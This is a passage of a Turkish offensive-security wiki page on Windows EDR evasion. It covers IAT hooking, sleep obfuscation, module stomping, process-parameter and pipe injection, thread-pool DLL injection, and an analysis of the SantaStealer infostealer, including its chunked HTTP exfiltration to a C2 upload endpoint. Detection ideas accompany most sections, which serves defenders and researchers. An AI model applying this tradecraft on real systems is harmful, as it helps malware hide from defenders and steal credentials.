//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Patch'i relocations/ASLR sonrasında ve import ilk kez kullanılmadan önce uygulayın. TitanLdr/AceLdr gibi reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking yapıldığını gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch öncesinde yakaladığınız özgün IAT değerini kullanarak veya LdrGetProcedureAddress üzerinden çözümleyin.
- PIC için RW → RX geçişlerini kullanın ve yazılabilir+çalıştırılabilir sayfalar bırakmayın.

Call-stack spoofing stub
- Draugr tarzı PIC stub'ları sahte bir çağrı zinciri (benign modüllerdeki return address'ler) oluşturur ve ardından gerçek API'ye geçiş yapar.
- Bu, Beacon/BOF'ların hassas API'lere yönelik canonical stack'ler kullandığını bekleyen tespitleri etkisiz kılar.
- API prologue'una ulaşmadan önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- DLL yüklendiğinde PIC ve hook'ların otomatik başlatılması için reflective loader'ı post-ex DLL'lerin başına ekleyin.
- Beacon ve BOF'ların kod değişikliği olmadan aynı evasion yolundan şeffaf biçimde yararlanması için hedef API'leri kaydeden bir Aggressor script kullanın.

Detection/DFIR değerlendirmeleri
- IAT bütünlüğü: image dışı (heap/anon) adreslere çözümlenen girdiler; import pointer'larının periyodik doğrulanması.
- Stack anomalileri: yüklenen image'lara ait olmayan return address'ler; image dışı PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetrisi: süreç içi IAT yazımları, import thunk'larını değiştiren erken DllMain etkinliği, yükleme sırasında oluşturulan beklenmedik RX bölgeleri.
- Image-load evasion: LoadLibrary* hook'lanıyorsa, bellek maskeleme olaylarıyla ilişkili şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT patching yapan reflective loader'lar (örn. TitanLdr, AceLdr)
- Memory masking hook'ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO üzerinden import-time IAT hook'ları

Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden özel bir resolver ile değiştirerek `ProcessImports()` **sırasında** import'ları hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC kendini serbest bıraktıktan sonra da varlığını sürdüren bir **resident PICO** (kalıcı PIC nesnesi) oluşturun.
- Loader'ın import resolver'ını değiştiren bir `setup_hooks()` işlevini dışa aktarın (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'ları atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı hook araması kullanın. Bir hook varsa onu döndürün; yoksa gerçek `GetProcAddress` işlevine yönlendirin.
- Hook hedeflerini link-time'da Crystal Palace `addhook "MODULE$Func" "hook"` girdileriyle kaydedin. Hook, resident PICO içinde yaşadığı için geçerliliğini korur.

Böylece yüklenen DLL'in code section'ını yükleme sonrasında patch'lemeden **import-time IAT yönlendirmesi** sağlanır.

### Hedef PEB-walking kullanırken hook'lanabilir import'ları zorlamak

Import-time hook'lar yalnızca işlev gerçekten hedefin IAT'sindeyse tetiklenir. Bir modül API'leri PEB-walk + hash ile çözümlüyorsa (import girdisi yoksa), loader'ın `ProcessImports()` yolunun bunu görmesi için gerçek bir import ekleyin:

- Hash'lenmiş export çözümlemesini (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Derleyici bir IAT girdisi üretir; böylece reflective loader import'ları çözümlerken araya girilebilir.

### `Sleep()` patch'lemeden Ekko tarzı sleep/idle obfuscation

`Sleep`'i patch'lemek yerine implantın kullandığı **gerçek wait/IPC primitive'lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook'layın. Uzun beklemelerde çağrıyı, idle sırasında bellekteki image'ı şifreleyen Ekko tarzı bir obfuscation zinciriyle sarmalayın:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue` işlevini hazırlanmış `CONTEXT` frame'leriyle çağıran bir callback dizisi zamanlamak için `CreateTimerQueueTimer` kullanın.
- Tipik zincir (x64): image'ı `PAGE_READWRITE` yapın → `advapi32!SystemFunction032` ile eşlenmiş image'ın tamamını RC4 ile şifreleyin → bloklayan wait'i gerçekleştirin → RC4 ile şifrelemeyi çözün → PE section'larını dolaşarak **section başına izinleri geri yükleyin** → tamamlandığını bildirin.
- `RtlCaptureContext` bir `CONTEXT` şablonu sağlar; bunu birden fazla frame'e kopyalayın ve her adımı çağırmak için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: çağıran devam ederken image maskelenmiş kalsın diye uzun wait'ler için (örn. `WAIT_OBJECT_0`) “success” döndürün. Bu yöntem, idle aralıklarında modülü scanner'lardan gizler ve klasik “patched `Sleep()`” imzasından kaçınır.

Detection fikirleri (telemetri tabanlı)
- `NtContinue` işaret eden `CreateTimerQueueTimer` callback'lerinin yoğun biçimde çalışması.
- Büyük ve bitişik, image boyutundaki buffer'lar üzerinde `advapi32!SystemFunction032` kullanılması.
- Büyük aralığı kapsayan `VirtualProtect` çağrısını, özel section başına izinlerin geri yüklenmesinin izlemesi.

### Sleep-obfuscation gadget'ları için runtime CFG kaydı

CFG etkin hedeflerde `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget'a yapılan ilk indirect jump, gadget modülün CFG metadata'sında bulunmadığı için genellikle süreci `STATUS_STACK_BUFFER_OVERRUN` ile çökertir. Ekko/Kraken tarzı zincirleri harden edilmiş süreçlerde çalışır durumda tutmak için:<sup>[[30]](#references)</sup>

- Zincirin kullandığı her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` girdileriyle kaydedin.
- Yüklenmiş image'lardaki adresler için (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` **image base** adresinden başlamalı ve **image'ın tamamını** kapsamalıdır.
- Manuel eşlenmiş/PIC/stomped bölgeler için bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget'ını değil, indirect olarak ulaşılan export'ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect target olacak saldırgan kontrollü executable section'ları da işaretleyin.

Bu, ROP/JOP tarzı sleep zincirlerini “yalnızca CFG olmayan süreçlerde çalışır” durumundan `/guard:cf` ile derlenmiş `explorer.exe`, tarayıcılar, `svchost.exe` ve diğer endpoint'lerde kullanılabilir bir primitive'e dönüştürür.

### Uyuyan thread'ler için CET-safe stack spoofing

Tam `CONTEXT` değiştirme gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü spoof edilmiş `Rip` değerinin donanım shadow stack'iyle eşleşmesi gerekir. Sleep-masking için daha güvenli bir yöntem:<sup>[[30]](#references)</sup>

- Aynı süreçteki başka bir thread'i seçin ve `NtQueryInformationThread` üzerinden `NT_TIB` / TEB stack sınırlarını (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread'in gerçek TEB/TIB'sini yedekleyin.
- `GetThreadContext` ile gerçek uyku bağlamını yakalayın.
- Spoof bağlamına **yalnızca** gerçek `Rip` değerini kopyalayın; spoof edilmiş `Rsp`/stack durumunu değiştirmeyin.
- Sleep aralığında, stack walker'ların geçerli bir stack aralığında unwind yapması için spoof thread'in `NT_TIB`'sini mevcut TEB'ye kopyalayın.
- Wait tamamlandıktan sonra özgün TIB'yi ve thread context'ini geri yükleyin.

Bu, CET ile uyumlu bir instruction pointer'ı korurken TEB stack metadata'sına güvenerek unwind'leri doğrulayan EDR stack walker'larını yanıltır.

### Alternatif: APC tabanlı Kraken Mask

Timer-queue dispatch fazla imza bırakıyorsa aynı sleep-encrypt-spoof-restore dizisi, queued APC'ler kullanılarak suspend edilmiş bir helper thread'den yürütülebilir:<sup>[[27]](#references)</sup>

- Entry point'i `NtTestAlert` olan bir helper thread oluşturun.
- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile kuyruğa alın ve `NtAlertResumeThread` ile çalıştırın.
- Varsayılan 64 KB thread stack'ini tüketmemek için zincir durumunu helper stack'i yerine heap'te saklayın.
- Başlangıç event'ini atomik olarak sinyallemek ve bloke olmak için `NtSignalAndWaitForSingleObject` kullanın.
- TIB/context'i geri yüklemeden önce ana thread'i suspend ederek, scanner'ın yarı geri yüklenmiş bir stack'i yakalayabileceği yarış penceresini daraltın (`NtSuspendThread` → restore → `NtResumeThread`).

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` imzasını helper-thread/APC imzasıyla değiştirir.

Ek detection fikirleri
- Sleep, wait veya APC dispatch'ten kısa süre önce `VmCfgCallTargetInformation` ile `NtSetInformationVirtualMemory` çağrılması.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` çevresinde `GetThreadContext`/`SetThreadContext` çağrıları.
- `NtQueryInformationThread` çağrısının ardından mevcut thread'in TEB/TIB stack sınırlarına doğrudan yazılması.
- `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper'larına dolaylı olarak ulaşan `NtQueueApcThread`/`NtAlertResumeThread` zincirleri.
- İmzalı modüllerde dispatch pivot'ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget imzalarının tekrarlı kullanımı.


## Precision Module Stomping

Module stomping, belirgin private executable memory ayırmak veya yeni bir sacrificial DLL yüklemek yerine payload'ları hedef süreçte önceden eşlenmiş bir DLL'in **`.text` section'ından** çalıştırır. Üzerine yazılacak hedef, süreçte hâlâ gereken kod yollarını bozmadan payload'ı barındırabilecek **yüklenmiş, disk destekli bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Güvenilir hedef seçimi

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modüllere gelişigüzel stomp uygulamak kırılgandır: DLL uzak süreçte yüklenmemiş olabilir ve fazla küçük bir code region süreci çökertir. Daha güvenilir bir iş akışı:

1. Hedef süreç modüllerini listeleyin ve yalnızca hâlihazırda yüklenmiş DLL'lerin adlarını içeren bir include list tutun.
2. Önce payload'ı oluşturun ve **tam byte boyutunu** kaydedin.
3. Diskteki aday DLL'leri tarayın ve PE section **`.text` `Misc_VirtualSize`** değerini payload boyutuyla karşılaştırın. Bu, dosya boyutundan daha önemlidir; çünkü executable section'ın **belleğe eşlendiğindeki** boyutunu gösterir.
4. **Export Address Table (EAT)**'i parse edin ve stomp başlangıç offset'i olarak dışa aktarılan bir işlevin RVA değerini seçin.
5. **Blast radius**'u hesaplayın: payload seçilen işlev sınırını aşarsa, bellekte ondan sonra yer alan bitişik export'ların üzerine yazılır.

Sahada görülen tipik recon/seçim yardımcıları:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasyonel notlar
- `LoadLibrary` telemetrisinden/beklenmedik image load'lardan kaçınmak için uzak süreçte **zaten yüklü** DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi hâlde normal code path'ler thread oluşturulmadan önce veya sonra stomp edilmiş byte'lara erişebilir.
- Büyük implantlarda, buffer'ın tamamının injector source içinde doğru temsil edilmesi için shellcode embedding'i string literal'dan **byte-array/braced initializer** biçimine çevirmek çoğu zaman gerekir.

Detection fikirleri
- Daha yaygın private RWX/RX allocation'lar yerine **image-backed executable page**'lere (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan uzak yazmalar.
- Bellekteki byte'ları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- İlk byte'ları yakın zamanda değiştirilmiş meşru bir DLL export'u içinde çalışmaya başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` page'lerine karşı yapılan ve ardından thread creation ile devam eden şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write yolunu (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Çalışan bir hedefe byte kopyalamak yerine, Windows'un seçili `CreateProcessW` başlangıç parametrelerini child process'e **kopyalayıp** `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması özelliğinden yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan poison edilebilir taşıyıcılar

Kullanışlı taşıyıcılar:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Taşıyıcılarla ilgili pratik kısıtlamalar:

- `lpCommandLine`, `CreateProcessW` için **yazılabilir belleği** göstermeli ve null terminator dâhil en fazla **32.767 Unicode karakter** içerebilir.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string'lerinden oluşan ve fazladan bir `\0` ile sonlandırılan bir Unicode environment block olmalıdır.
- `lpReserved` resmî olarak rezerve edilmiştir; bu nedenle `ShellInfo` eşlemesi, belgelenmiş ve kararlı bir sözleşme yerine implementation detail olarak değerlendirilmelidir.

Böylece normal process creation, **payload-transfer primitive** hâline gelir. Operatör, saldırganın kontrolündeki başlangıç verileriyle child process'i oluşturur ve cross-process kopyalama işlemini Windows'a yaptırır.

### Remote write API'leri olmadan remote lookup akışı

Child oluşturulduktan sonra, kopyalanan buffer'ı **salt okunur** primitive'lerle bulun:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`'yi okuyun
3. `PEB.ProcessParameters` değerini takip edin
4. `RTL_USER_PROCESS_PARAMETERS` yapısını okuyun
5. Seçilen pointer'ı kullanın:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimal akış:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kopyalanan parametre tamponunu yürütme

Kopyalanan parametre bölgesi genellikle `RW` olur, yürütülebilir değildir. Yaygın bir P3 zinciri şöyledir:

1. Süreci normal şekilde oluşturun (askıya alınmış olarak değil)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` kullanarak seçilen parametre sayfasını yürütülebilir hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülen ana iş parçacığı tanıtıcısını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` üzerine yazar) ile yürütmeyi yönlendirin

Klasik thread hijacking iş akışlarından farklı olarak, bu yöntem **`SuspendThread` / `ResumeThread` gerektirmez**; döndürülen ana iş parçacığı tanıtıcısının bağlamı doğrudan değiştirilebilir.

Bu, injection için yaygın olarak izlenen birkaç API'nin kullanılmasını önler:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread` de

### Null-byte sınırlaması ve aşamalı shellcode

Üç taşıyıcının tümü **string veya string benzeri veriler** olduğundan, `0x00` içeren ham bir payload aktarım sırasında kesilir. Kullanışlı bir çözüm, sabit değerleri çalışma zamanında yeniden oluşturan ve ardından isteğe bağlı ikinci bir aşamayı yükleyen **null içermeyen bir ilk aşamadır**.

Basit bir yöntem, XOR tabanlı sabit değer sentezidir:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Bu, ilk aşamanın taşınan parametreye null byte eklemeden stack string’leri, API argümanlarını, DLL yollarını veya ikinci aşama shellcode loader’ını oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API’leri çağırması gerektiğinde şunları yapabilir:

- string/buffer’ı hedef stack’e push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` register’larını sabitlere veya `RSP`’ye göreli pointer’lara ayarlamak
- çağrıdan önce `RSP`’yi **16-byte hizalı** tutmak

Ardından ikinci aşama stack’ten `PAGE_READWRITE` izinlerine sahip bir bellek alanına kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX bellek ayırmadan buraya dallanılabilir.

### Tespit fikirleri

Yazarların belirttiği iyi araştırma fırsatları:

- **process-parameter sayfalarını executable** yapan `VirtualProtectEx` / `NtProtectVirtualMemory` çağrıları
- bu izin değişikliğinin ardından gelen `SetThreadContext` / `NtSetContextThread` çağrıları
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` üzerinde yapılan uzak okumalar
- process oluşturulurken alışılmadık derecede uzun veya yüksek entropili `lpCommandLine`, `lpEnvironment` ya da `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, **process’ler arası bir aktarım tekniğidir**; tek başına tam bir execution primitive değildir: kopyalanan parametre için yine de execute izni değişikliği ve execution yönlendirme yöntemi gerekir.
- `RtlCreateProcessReflection` / Dirty Vanity yazarlarca değerlendirilmiş, ancak dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive’lere başvurduğu için elenmiştir.

## Console STDIN pipe injection

Etkileşimli bir console child, **payload aktarım primitive’i** olarak da kullanılabilir. Injector, child’ın standart girdisini bir pipe’a yönlendirir ve bir marker’ın ardından shellcode gönderir. Console programı veriyi kendi özel belleğine okuduktan sonra injector bu buffer’ı bulur, executable yapar ve bir child thread’ini buraya yönlendirir. Bu yöntem `VirtualAllocEx` ve `WriteProcessMemory` kullanmaktan kaçınır, ancak genel amaçlı bir EDR bypass değil, process injection tekniğidir.<sup>[[41]](#references)</sup>

Açıklamada “named-pipe” denmesine rağmen, referans implementasyonu `CreatePipe` çağırır ve bu bir **anonymous pipe** oluşturur. Windows, anonymous pipe’ları dahili olarak benzersiz adlı pipe nesneleriyle uygular; ancak PoC, `\\.\pipe\<name>` yolunu seçmez ve `CreateNamedPipe` çağırmaz. Varsayılan bir security descriptor ile devralınabilir handle’lar oluşturur, read handle’ı `STARTUPINFO.hStdInput` içine yerleştirir, `STARTF_USESTDHANDLES` ayarını yapar ve handle inheritance etkinleştirilmiş şekilde yeni bir child başlatır. Bu nedenle PoC, sağlanan console executable’ını başlatır; pipe’ını mevcut bir process’e bağlamaz.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referans iş akışı

Implementasyon şu zinciri kullanır:<sup>[[41]](#references)</sup>

1. Child’ın `STDIN` ve `STDOUT` akışları için anonymous pipe çiftleri oluşturun. Parent tarafındaki iki handle’da inheritance özelliğini devre dışı bırakın ve process oluşturulduktan sonra child tarafındaki kopyaları parent’ta kapatın.
2. `CREATE_NEW_CONSOLE` ile `netsh.exe` veya `nslookup.exe` gibi etkileşimli bir executable başlatın. Child, yönlendirilmiş standart handle’ları devralır.
3. `WriteFile` ile parent tarafındaki `STDIN` handle’ı üzerinden tüm ikili `rawData` dizisini gönderin. Console programı byte’ları okur ve kendi özel, commit edilmiş bölgelerinden birinde bir kopya bırakır.
4. Child’ın adres alanını `VirtualQueryEx` ile dolaşın, aday `MEM_PRIVATE` bölgelerini `ReadProcessMemory` ile okuyun ve `rawData`’nın başındaki marker’ı arayın.
5. Bulunan buffer’ın izinlerini `VirtualProtectEx` ile `PAGE_EXECUTE_READWRITE` olarak değiştirin.
6. Ana thread’i belirleyin, suspend edin, `NtSetContextThread` ile `RIP`’yi `found_address + 0x19` olarak ayarlayın ve thread’i devam ettirin.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Sağlanan uygulama x64'e özeldir: `CONTEXT.Rip` alanını değiştirir ve gömülü payload'u x64 shellcode'dur. `rawData`, 25 baytlık bir işaretçiyle başlar; dolayısıyla çalıştırılabilir baytlar onaltılık `0x19` ofsetinde başlar. Payload'u değiştirirken bu düzeni koruyun veya işaretçiyi, arama vektörünü, dizi boyutunu ve yürütme ofsetini birlikte güncelleyin. Kaynak yorumlarında `0x0A`, `0x0D` ve `0x1A` da bad character olarak listelenmiştir. Bu iş akışı, alt sürecin token'ını veya ayrıcalıklarını değiştirmez.<sup>[[41]](#references)</sup>

Küçük native yardımcılar ve payload derleme kalıpları için [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md) sayfasına bakın.

## Shellcode kullanmadan thread-pool callback DLL injection (DLLParty)

DLLParty, PoolParty tarzı thread-pool injection yöntemini uyarlayarak mevcut bir hedef worker'ın enjekte edilmiş bir callback stub'ını çalıştırması yerine `LoadLibraryA` çağırmasını sağlar. Dispatch primitive'i, hedef pool'un I/O completion port'una kuyruğa alınan bir `TP_DIRECT` completion'dır. Bu yöntem süreç izinlerini bypass etmez: PoC, `OpenProcess(PROCESS_ALL_ACCESS)` çağırır ve okunabilir/yazılabilir hedef belleğe, ayrıca çoğaltılabilir worker-factory ve completion-port handle'larına ihtiyaç duyar.<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64'te worker, stack üzerinde bulunan `TP_CALLBACK_INSTANCE` işaretçisini ilk callback argümanı olan `RCX` üzerinden geçirir. `LoadLibraryA` aynı işaretçiyi `LPCSTR` olarak yorumlar. Test edilen yolda `TppWorkerThread`, işaretçiyi `RSP+0x178` adresinde oluştururken, bu nesneye yaptığı ilk olağan yazma `RSP+0x1d0` adresindedir. Bu nedenle, 0x58 baytlık bu öneke sığan null-terminated bir DLL path, dispatch öncesinde üzerine yazılmadan instance'ın başlangıcında yer alabilir. Bu, belirli bir build'de gözlemlenmiştir; belgelenmiş bir Windows ABI garantisi değildir.<sup>[[46]](#references)[[47]](#references)</sup>

Referans iş akışı şöyledir:<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)` ile hedefin handle'larını numaralandırın ve nesne türlerini sorgulayarak `TpWorkerFactory` nesnesini belirleyin. Bir worker-factory handle'ını çoğaltıp `WorkerFactoryBasicInformation` sorgulayın; `StartParameter`, uzak `TP_POOL` bilgisini verir. `TotalWorkerCount == 0` olan factory'leri atlayın.
2. `TP_POOL.CompletionPort` değerini okuyun ve pool'un özel worker listesini dolaşın. Test edilen Windows 10 19045 x64 build'inde (`ntdll.dll 10.0.19041.4842`), listenin başı `pool+0x60` adresindedir; her bağlantı `worker+0x10` adresindedir, dolayısıyla `worker+0x38` adresindeki callback-instance slot'u `link+0x28` değerine eşittir. PoC; işaretçi hizalamasını, bağlantıların karşılıklılığını, pool sahipliğini, sıfır olmayan thread ID'lerini, yinelenen düğümleri ve sabit bir liste başını kontrol eder.
3. Kuyruğa alınan completion herhangi bir worker tarafından tüketilebileceğinden, DLL path'ini bulunan **her** worker slot'una yazın. `Callback = LoadLibraryA` olan bir `TP_DIRECT` nesnesini hedefteki yazılabilir belleğe yerleştirin. PoC, `VirtualAllocEx` yerine worker stack'inde `last_slot-0x500` ofsetini kullanır; bu ofset deneysel olarak belirlenmiştir ve aktif stack verileriyle çakışmamalıdır.
4. Hedef completion-port handle'ını çoğaltın ve `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` çağrısını yapın. Uzak `TP_DIRECT` adresi completion key'dir. Mevcut bir worker daha sonra üzerine yazılmış callback-instance işaretçisiyle `LoadLibraryA` çağırır ve hedefin erişebildiği bir DLL'i yükler.

PoC, hedef PID'sini (`DLLParty.exe <target_pid>`) alır ve `DLLParty.cpp` içinde sabit kodlanmış bir DLL path kullanır; x64 executable oluşturmadan önce hedefin erişebileceği bir path ayarlayın. Ayrıca kendi sürecindeki `LoadLibraryA` adresini uzak callback olarak kullandığından, bu adresin hedefte de geçerli olduğunu varsayar. Kod, path uzunluğunu 0x58 baytlık öneke sığdığını doğrulamaz ve worker dolaşımında dizinin son elemanını indekslemeden önce bir slot bulunup bulunmadığını kontrol etmez. Hedef build için özel ofsetleri, stack düzenini ve yazılabilir alanı yeniden doğrulayın. `CreateRemoteThreadEx`, shellcode ve `VirtualAllocEx` kullanılmaması, süreçler arası yazma işlemlerini veya DLL yükleme telemetrisini ortadan kaldırmaz.<sup>[[46]](#references)[[47]](#references)</sup>

## Dosyasız Kaçınma ve Kimlik Bilgisi Hırsızlığı için SantaStealer Taktikleri

SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve kimlik bilgilerine erişimi tek bir iş akışında nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Klavye düzeni denetimi ve sandbox gecikmesi

- Bir yapılandırma bayrağı (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla yüklü klavye düzenlerini numaralandırır. Kiril alfabesi kullanan bir düzen bulunursa örnek, boş bir `CIS` işaretçisi bırakır ve stealer'ları çalıştırmadan sonlanır; böylece hariç tutulan yerel ayarlarda hiçbir zaman tetiklenmezken avlama için bir iz bırakır.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Katmanlı `check_antivm` mantığı

- Variant A, süreç listesini dolaşır, her adı özel bir rolling checksum ile hash’ler ve sonucu debugger/sandbox’lar için gömülü blocklist’lerle karşılaştırır; checksum işlemini bilgisayar adı üzerinde de tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B, sistem özelliklerini inceler (asgari süreç sayısı, yakın zamandaki çalışma süresi), VirtualBox additions’ı tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve tek adımlı yürütmeyi fark etmek için uyku aralıklarında zamanlama kontrolleri gerçekleştirir. Herhangi bir bulgu, modüller başlatılmadan önce işlemi sonlandırır.

### Fileless yardımcı + çift ChaCha20 reflective loading

- Birincil DLL/EXE, diske bırakılan veya belleğe manuel olarak eşlenen bir Chromium kimlik bilgisi yardımcısı içerir; fileless modda import’ları/relocation’ları kendisi çözümler ve böylece yardımcıya ait hiçbir dosya diske yazılmaz.
- Bu yardımcı, ikinci aşama bir DLL’i ChaCha20 ile iki kez şifrelenmiş olarak saklar (iki adet 32 baytlık anahtar + 12 baytlık nonce). Her iki şifre çözme geçişinin ardından blob’u reflective olarak yükler (`LoadLibrary` kullanmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) üzerinden elde edilen `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export’larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator yordamları, canlı bir Chromium tarayıcısına inject etmek, AppBound Encryption anahtarlarını devralmak ve ABE hardening’e rağmen SQLite veritabanlarından parolaları/çerezleri/kredi kartlarını doğrudan decrypt etmek için direct-syscall reflective process hollowing kullanır.


### Modüler bellek içi toplama ve parçalı HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer tablosunu dolaşır ve etkin modül başına bir thread başlatır (Telegram, Discord, Steam, ekran görüntüleri, belgeler, browser extensions vb.). Her thread sonuçları paylaşılan buffer’lara yazar ve yaklaşık 45 saniyelik join süresinin ardından dosya sayısını bildirir.
- İşlem bitince her şey, statik olarak bağlanan `miniz` library’siyle `%TEMP%\\Log.zip` konumunda ZIP’lenir. Ardından `ThreadPayload1` 15 saniye bekler ve arşivi HTTP POST ile `http://<C2>:6767/upload` adresine 10 MB’lık parçalar hâlinde gönderir; tarayıcıya ait `multipart/form-data` boundary’sini (`----WebKitFormBoundary***`) taklit eder. Her parçaya `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı `w: <campaign_tag>` eklenir; son parçaya ise C2’nin yeniden birleştirmenin tamamlandığını bilmesi için `complete: true` eklenir.

## References

- [1] [Gelişmiş Evasion Tradecraft: Hassas Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack’ler, malware için artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – belgeler](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – örnek](https://tradecraftgarden.org/simplehook.html)
